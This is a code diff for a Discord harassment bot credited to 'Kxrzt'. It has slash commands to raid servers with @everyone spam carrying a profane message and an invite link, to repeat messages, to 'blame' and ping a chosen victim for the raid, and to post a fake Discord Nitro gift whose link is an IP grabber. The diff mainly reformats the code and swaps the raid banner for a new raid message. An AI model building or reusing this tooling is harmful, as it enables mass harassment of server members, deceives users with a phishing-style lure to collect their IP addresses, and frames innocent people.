@@ -6,28 +6,13 @@ import {
 } from 'discord.js';
 
 // ---- config ----
-const RAID_LINES = 60;  // how many ﷽ lines
-const RAID_CHARS = 14;  // how many ﷽ per line
+const RAID_COUNT = 20; // /raid spam count
+const SPAM_COUNT = 5;  // /spam spam count
 
 const NITRO_ICON = 'https://cdn3.emoji.gg/emojis/7536-nitro.png';
 const IPGRAB_LINK = 'https://discord-gg-zjk2bx79e.base44.app';
 
-const raidBanner = Array.from(
-  { length: RAID_LINES },
-  () => '# ' + '﷽'.repeat(RAID_CHARS)
-).join('\n');
-
-const RAID_MESSAGE = [
-  raidBanner,
-  '||<@everyone|@here>||',
-  '-# Raided by Kxrzt',
-  '-# Want to raid other servers? Join us.',
-  '',
-  'https://discord.gg/BdgWQ4pGaq',
-].join('\n');
-
-const RAID_COUNT = 20; // /raid spam count
-const SPAM_COUNT = 5;  // /spam spam count
+const RAID_MESSAGE = `# @everyone FUCK Y'ALL BITCHES, EASY RAID ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #`;
 // ----------------
 
 const MENTIONS = { parse: ['everyone', 'roles', 'users'] };
@@ -41,26 +26,11 @@ const HELP_EMBED = new EmbedBuilder()
   .setTitle('Commands')
   .setDescription('Here is everything this bot can do:')
   .addFields(
-    {
-      name: '/raid',
-      value: 'Posts the big ﷽ banner a bunch of times to raid a server.',
-    },
-    {
-      name: '/spam <message>',
-      value: 'Repeats your message multiple times. You type the text once, hit the button, and it fires.',
-    },
-    {
-      name: '/blame <victim>',
-      value: 'Blames someone for the raid and pings them.',
-    },
-    {
-      name: '/ipgrab <amount>',
-      value: 'Drops a fake Discord Nitro gift. Pick how many times (1-5) and hit **send**.',
-    },
-    {
-      name: '/help',
-      value: 'Shows this list.',
-    },
+    { name: '/raid', value: 'Posts the raid text a bunch of times to raid a server.' },
+    { name: '/spam <message>', value: 'Repeats your message multiple times. You type the text once, hit the button, and it fires.' },
+    { name: '/blame <victim>', value: 'Blames someone for the raid and pings them.' },
+    { name: '/ipgrab <amount>', value: 'Drops a fake Discord Nitro gift. Pick how many times (1-5) and hit **send**.' },
+    { name: '/help', value: 'Shows this list.' },
   )
   .setFooter({ text: 'Made by Kxrzt' });
 
@@ -72,25 +42,15 @@ client.on(Events.InteractionCreate, async interaction => {
   try {
     // ---------------- /help ----------------
     if (interaction.isChatInputCommand() && interaction.commandName === 'help') {
-      return interaction.reply({
-        embeds: [HELP_EMBED],
-        flags: MessageFlags.Ephemeral,
-      });
+      return interaction.reply({ embeds: [HELP_EMBED], flags: MessageFlags.Ephemeral });
     }
 
     // ---------------- /raid ----------------
     if (interaction.isChatInputCommand() && interaction.commandName === 'raid') {
       const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-          .setCustomId('raid_button')
-          .setLabel('raid')
-          .setStyle(ButtonStyle.Primary)
+        new ButtonBuilder().setCustomId('raid_button').setLabel('raid').setStyle(ButtonStyle.Primary)
       );
-      return interaction.reply({
-        content: 'start raid?',
-        components: [row],
-        flags: MessageFlags.Ephemeral,
-      });
+      return interaction.reply({ content: 'start raid?', components: [row], flags: MessageFlags.Ephemeral });
     }
 
     if (interaction.isButton() && interaction.customId === 'raid_button') {
@@ -106,19 +66,12 @@ client.on(Events.InteractionCreate, async interaction => {
       const text = interaction.options.getString('message');
       const id = randomUUID();
       spamCache.set(id, text);
-      setTimeout(() => spamCache.delete(id), 60 * 60 * 1000); // clean up after 1h
+      setTimeout(() => spamCache.delete(id), 60 * 60 * 1000);
 
       const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-          .setCustomId(`spam:${id}`)
-          .setLabel('spam')
-          .setStyle(ButtonStyle.Primary)
+        new ButtonBuilder().setCustomId(`spam:${id}`).setLabel('spam').setStyle(ButtonStyle.Primary)
       );
-      return interaction.reply({
-        content: 'Spam ur message',
-        components: [row],
-        flags: MessageFlags.Ephemeral,
-      });
+      return interaction.reply({ content: 'Spam ur message', components: [row], flags: MessageFlags.Ephemeral });
     }
 
     if (interaction.isButton() && interaction.customId.startsWith('spam:')) {
@@ -135,43 +88,24 @@ client.on(Events.InteractionCreate, async interaction => {
     if (interaction.isChatInputCommand() && interaction.commandName === 'blame') {
       const victim = interaction.options.getUser('victim');
       const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-          .setCustomId(`blame:${victim.id}`)
-          .setLabel('blame')
-          .setStyle(ButtonStyle.Danger)
+        new ButtonBuilder().setCustomId(`blame:${victim.id}`).setLabel('blame').setStyle(ButtonStyle.Danger)
       );
-      return interaction.reply({
-        content: `<@${victim.id}>`,
-        components: [row],
-        flags: MessageFlags.Ephemeral,
-      });
+      return interaction.reply({ content: `<@${victim.id}>`, components: [row], flags: MessageFlags.Ephemeral });
     }
 
     if (interaction.isButton() && interaction.customId.startsWith('blame:')) {
       const victimId = interaction.customId.slice(6);
-      await interaction.reply({
-        content: `<@${victimId}> Your Raid has been succesful!`,
-        allowedMentions: MENTIONS,
-      });
+      await interaction.reply({ content: `<@${victimId}> Your Raid has been succesful!`, allowedMentions: MENTIONS });
       return;
     }
 
     // ---------------- /ipgrab ----------------
     if (interaction.isChatInputCommand() && interaction.commandName === 'ipgrab') {
       const amount = interaction.options.getInteger('amount') ?? 1;
-
       const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-          .setCustomId(`ipgrab:${amount}`)
-          .setLabel('send')
-          .setStyle(ButtonStyle.Success)
+        new ButtonBuilder().setCustomId(`ipgrab:${amount}`).setLabel('send').setStyle(ButtonStyle.Success)
       );
-
-      return interaction.reply({
-        content: 'get their ip',
-        components: [row],
-        flags: MessageFlags.Ephemeral,
-      });
+      return interaction.reply({ content: 'get their ip', components: [row], flags: MessageFlags.Ephemeral });
     }
 
     if (interaction.isButton() && interaction.customId.startsWith('ipgrab:')) {
